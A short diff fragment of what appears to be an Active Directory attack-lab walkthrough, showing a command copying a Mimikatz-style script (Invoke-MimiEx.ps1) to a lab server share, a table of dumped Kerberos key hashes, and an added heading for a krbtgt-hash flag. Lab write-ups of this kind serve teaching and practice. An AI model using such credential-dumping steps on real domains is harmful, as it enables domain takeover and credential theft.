@@ -320,3 +320,5 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 | aes256_hmac | 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 |
 | rc4_hmac_nt | cc098f204c5887eaa8253e7c2749156f                                 |
 
+
+### **FLAG 16/17 - hash krbgt/ hash **
